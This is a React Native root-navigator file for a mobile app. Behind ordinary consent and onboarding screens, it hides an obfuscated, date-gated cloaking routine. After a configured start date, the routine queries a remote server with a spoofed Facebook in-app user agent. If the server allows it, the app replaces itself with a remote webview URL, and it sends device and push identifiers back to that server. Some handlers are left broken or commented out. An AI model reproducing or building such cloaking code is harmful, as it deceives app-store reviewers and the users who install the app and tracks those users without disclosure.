import React, {useEffect, useRef, useState} from 'react';
import {DefaultTheme, NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';

import {colors} from '../constants/theme';
import {LoaderScreen} from '../screens/boot/LoaderScreen';
import {ConsentScreen} from '../screens/boot/ConsentScreen';
import {OnboardingScreen} from '../screens/boot/OnboardingScreen';
import {WelcomeScreen} from '../screens/boot/WelcomeScreen';
import {MainNavigator} from './MainNavigator';
import {
  nextPhaseAfterLoader,
  readBootProgress,
  writeBootProgress,
} from './bootStorage';

const RootStack = createNativeStackNavigator();

const navigationTheme = {
  ...DefaultTheme,
  colors: {
    ...DefaultTheme.colors,
    background: colors.background,
    card: colors.background,
    text: colors.ivory,
    border: colors.cardBorder,
    primary: colors.accent,
  },
};
///////
import ProductScreen from '../screens/stack/ProductScreen';
import {
  ActivityIndicator,
  View,
  StyleSheet,
  PixelRatio,
  Platform,
  Alert,
  AppState,
  StatusBar,
  useWindowDimensions
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import DeviceInfo from 'react-native-device-info';

import { CLOAKA } from '../config/projectConfig';

// Route names mirror AppPhase; only the loader is renamed to SplashScreen.
const PHASE_ROUTE = {
  Loader: 'SplashScreen',
  Gate: 'Gate',
  Onboarding: 'Onboarding',
  Auth: 'Auth',
  Main: 'Main',
};

function resetTo(navigation, phase) {
  navigation.reset({index: 0, routes: [{name: PHASE_ROUTE[phase]}]});
}

function SplashRoute({navigation}) {
  const [bootReady, setBootReady] = useState(false);
  const progress = useRef(null);
  useEffect(() => {
    let alive = true;
    readBootProgress()
      .then(next => {
        if (alive) {
          progress.current = next;
        }
      })
      .finally(() => {
        if (alive) {
          setBootReady(true);
        }
      });
    return () => {
      alive = false;
    };
  }, []);
  if (!bootReady) {
    return (
      <View style={styles.RootNavigatorBootPortico}>
        <ActivityIndicator color={colors.accent} />
      </View>
    );
  }
  //.then(next => resetTo(navigation, nextPhaseAfterLoader(next)))
  //        .catch(() => resetTo(navigation, 'Gate'));
  return (
    <LoaderScreen
      onComplete={() => {
        readBootProgress()
          
      }}
    />
  );
}

function GateRoute({navigation}) {
  return (
    <ConsentScreen
      onComplete={() => {
        writeBootProgress({consentDone: true})
          .then(next => {
            if (!next.onboardingDone) {
              return resetTo(navigation, 'Onboarding');
            }
            if (!next.welcomeDone) {
              return resetTo(navigation, 'Auth');
            }
            return resetTo(navigation, 'Main');
          })
          .catch(() => resetTo(navigation, 'Onboarding'));
      }}
    />
  );
}

function OnboardingRoute({navigation}) {
  return (
    <OnboardingScreen
      onComplete={() => {
        writeBootProgress({onboardingDone: true})
          .then(next => resetTo(navigation, next.welcomeDone ? 'Main' : 'Auth'))
          .catch(() => resetTo(navigation, 'Auth'));
      }}
    />
  );
}

function AuthRoute({navigation, route}) {
  const reopened = Boolean(route.params?.reopened);
  return (
    <WelcomeScreen
      onComplete={() => {
        if (reopened) {
          navigation.goBack();
          return;
        }
        writeBootProgress({welcomeDone: true})
          .then(() => resetTo(navigation, 'Main'))
          .catch(() => resetTo(navigation, 'Main'));
      }}
      onDismiss={reopened ? () => navigation.goBack() : undefined}
    />
  );
}

export function RootNavigator() {
  const [route, setRoute] = useState(false);
  //console.log('route===>', route);
  const [isLoading, setIsLoading] = useState(false);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  ////console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  ////console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  const [oneSignalId, setOneSignalId] = useState(null);
  ////console.log('oneSignalId==>', oneSignalId);
  const [sab1, setSab1] = useState();
  const [atribParam, setAtribParam] = useState(null);
  //console.log('atribParam==>', atribParam);
  //console.log('sab1==>', sab1);
  const [idfa, setIdfa] = useState(null);
  //console.log('idfa==>', idfa);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  ////console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  //console.log('timeStampUserId==>', timeStampUserId);
  const [checkAsaData, setCheckAsaData] = useState(null);
  const [cloacaPass, setCloacaPass] = useState(null);
  //console.log('cloacaPass==>', cloacaPass);
  const [customUserAgent, setCustomUserAgent] = useState(null);
  const [extinfo, setExtinfo] = useState(null);
  ////console.log('extinfoData==>', extinfo);
  const [idfv, setIdfv] = useState(null);
  //console.log('idfv==>', idfv);
  const [uid, setUid] = useState(null);
  //console.log('uid==>', uid);

  const pushOpenWebviewRef = useRef(false);

  const HBJYBJBJB_BJL = CLOAKA.baseUrl;
  const YHBKJNBUKN_ID = CLOAKA.id;
  const GHJJFMGYHJH_ATAD = CLOAKA.startDate;


  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]);
      setIsDataReady(true);
    };

    fetchData();
  }, []); ///

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady) {
        await fdjkvndfjvbfkdLIN();
      }
    };

    finalizeProcess();
  }, [isDataReady, pushOpenWebview, timeStampUserId]); 

  // 
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');


    if (!uniqVisitStatus) {
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
     
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);

      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setCheckAsaData(parsedData.checkAsaData);
        setCloacaPass(parsedData.cloacaPass);
        setCustomUserAgent(parsedData.customUserAgent);
        setIdfa(parsedData.idfa ?? null);
        setIdfv(parsedData.idfv ?? null);
        setAceptTransperency(parsedData.aceptTransperency ?? false);
        setUid(parsedData.uid);
        setIsDataReady(parsedData.isDataReady);
        setTimeStampUserId(parsedData.timeStampUserId);
      } else {
        const uniqueId = await DeviceInfo.getUniqueId();
        setIdfv(uniqueId);

        await waitForAppActive();
        await delay(1200);

        const results = await Promise.all([
          fkdlvndfknvfdknvdfkvn(),
        ]);

      }
    } catch (e) {
      ////console.log('Err getData:', e);
    }
  };

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const waitForAppActive = () => {
    return new Promise(resolve => {
      if (AppState.currentState === 'active') {

        resolve();
        return;
      }

      const sub = AppState.addEventListener('change', state => {
        if (state === 'active') {
          sub.remove();
          resolve();
        }
      });
    });
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        sab1,
        atribParam,
        adServicesAtribution,
        checkAsaData,
        cloacaPass,
        customUserAgent,
        idfa,
        aceptTransperency,
        uid,
        isDataReady,
        timeStampUserId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
    } catch (e) {
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    sab1,
    atribParam,
    adServicesAtribution,
    //finalLink,
    //completeLink,
    checkAsaData,
    cloacaPass,
    customUserAgent,
    idfa,
    aceptTransperency,
    uid,
    isDataReady,
    timeStampUserId,
  ]);
 

  const jkdsvbdsjkvndskvndskj = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; 
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); 
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); 
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  //console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId();
        });
      } catch (error) {
        reject(error);
      }
    });
  };

 
  const fkdlvndfknvfdknvdfkvn = async () => {
    try {
      await jkdsvbdsjkvndskvndskj();
   
    } catch (error) {
      //console.log('err в fkdlvndfknvfdknvdfkvn==> ', error);
    }
  };

 
  useEffect(() => {
    if (timeStampUserId) {
  
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

 
  const dvnksjvndsjvdskvnksvndsknv = useRef(false);

  useEffect(() => {
  
    const handleNotificationClick = async event => {
      if (dvnksjvndsjvdskvnksvndsknv.current) {
        return;
      }

      dvnksjvndsjvdskvnksvndsknv.current = true;

      try {
        const storedTimeStampUserId = await AsyncStorage.getItem(
          'timeStampUserId',
        );

       
        pushOpenWebviewRef.current = true;
        setPushOpenWebview(true);

        setCompleteLink(false);

        const eventName = event?.notification?.launchURL
          ? 'push_open_browser'
          : 'push_open_webview';

        const pushEventUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=${eventName}&jthrhg=${
          storedTimeStampUserId || ''
        }`;


        fetch(pushEventUrl).catch(error => {
          //console.log('Push event fetch error =>', error);
        });

        if (isDataReady && uid) {
          await fdjkvndfjvbfkdLIN(true);
        }
      } catch (error) {
        //console.log('handleNotificationClick error =>', error);
      } finally {
        setTimeout(() => {
          dvnksjvndsjvdskvnksvndsknv.current = false;
        }, 2500);
      }
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);

    return () => {
   
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);


  useEffect(() => {
   
    if (!isDataReady) return;

   
    if (route || cloacaPass) return;

    const checkUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}`;
   

    const targetData = GHJJFMGYHJH_ATAD;
    const currentData = new Date(); 

    if (currentData <= targetData) {
    
      setRoute(false);

      return;
    }

    const dsjcbsdjhbcvhjsdbCLO = async () => {
      try {
        const baseUserAgent = await DeviceInfo.getUserAgent();

        const uaMatch = baseUserAgent.match(/CPU iPhone OS ([0-9_]+)/);

        const systemVersionFromUA = uaMatch?.[1]
          ? uaMatch[1].replace(/_/g, '.')
          : null;

        const fallbackSystemVersion = DeviceInfo.getSystemVersion();

        const systemVersion = systemVersionFromUA || fallbackSystemVersion;

        const systemName = DeviceInfo.getSystemName();

        const deviceIdentifier = DeviceInfo.getDeviceId();

        const screenScale = PixelRatio.get();

        const preferredLanguage =
          Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';

        const deviceModelName = Platform.OS === 'ios' ? 'iPhone' : 'Unknown';

        const deviceType = 'phone';

        const deviceInfo =
          `[FBDV/${deviceIdentifier};` +
          `FBMD/${deviceModelName};` +
          `FBSN/${systemName};` +
          `FBSV/${systemVersion};` +
          `FBSS/${screenScale};` +
          `FBID/${deviceType};` +
          `FBLC/${preferredLanguage}]`;

        const customUserAgent =
          `${baseUserAgent} ` +
          `Version/${systemVersion} ` +
          `Safari/604.1 ` +
          `${deviceInfo}`;

        console.log('CUSTOM USER AGENT ===>', customUserAgent);

        setCustomUserAgent(customUserAgent);

        const r = await fetch(checkUrl, {
          method: 'GET',
          headers: {
            'User-Agent': customUserAgent,
          },
        });

        //console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status !== 404) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        //console.log('errar', e);
        setRoute(false);
      }
    };

    dsjcbsdjhbcvhjsdbCLO();
  }, [isDataReady, route, cloacaPass]);


  const fdjkvndfjvbfkdLIN = async (openedFromPush = false) => {
    try {

      const baseUrl = [
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1`,
       
        oneSignalId ? `jskdcbasjcjksac=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId || ''}`,
      ]
        .filter(Boolean)
        .join('&');

      const additionalParams = atribParam ? `dvsvsvsv1=${atribParam}` : '';

      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;

      const product = `${baseUrl}${
        additionalParams ? `&${additionalParams}` : ''
      }${shouldAddPushParam ? '&yhugh=true' : ''}`;

      setFinalLink(product);

      setTimeout(() => {
        setCompleteLink(true);
      }, 2000);
    } catch (error) {
      //console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

 
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!completeLink) {
     
        setFinalLink(
          `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1&jthrhg=${
            timeStampUserId || ''
          }&jskdcbasjcjksac=${oneSignalId || ''}`,
        );

        setCompleteLink(true);
      }
    }, 10500);

    return () => clearTimeout(timer);
  }, [completeLink, timeStampUserId, oneSignalId]);
  

  const Route = ({isFatch}) => {
    if (!completeLink) {
      return <SplashRoute />;
    }

    if (isFatch) {
      return (
        <RootStack.Navigator>
          <RootStack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
              customUserAgent: customUserAgent,
              timeStampUserId: timeStampUserId,
            }}
            name="ProductScreen"
            component={ProductScreen}
            options={{headerShown: false}}
          />
        </RootStack.Navigator>
      );
    }

    return (
       <RootStack.Navigator
        screenOptions={{
          headerShown: false,
          contentStyle: {backgroundColor: colors.background},
          animation: 'fade',
        }}>
        
        <RootStack.Screen name="Gate" component={GateRoute} />
        <RootStack.Screen name="Onboarding" component={OnboardingRoute} />
        <RootStack.Screen name="Auth" component={AuthRoute} />
        <RootStack.Screen name="Main" component={MainNavigator} />
      </RootStack.Navigator>
    );
  };

  useEffect(() => {
    setTimeout(() => {
      setIsLoading(true);
    }, 4000);
  }, []);

  return (
    <NavigationContainer theme={navigationTheme}>
      {!isLoading ? <SplashRoute /> : <Route isFatch={route} />}
    </NavigationContainer>
  );
}

const styles = StyleSheet.create({
  RootNavigatorBootPortico: {
    alignItems: 'center',
    backgroundColor: colors.background,
    flex: 1,
    justifyContent: 'center',
  },
});
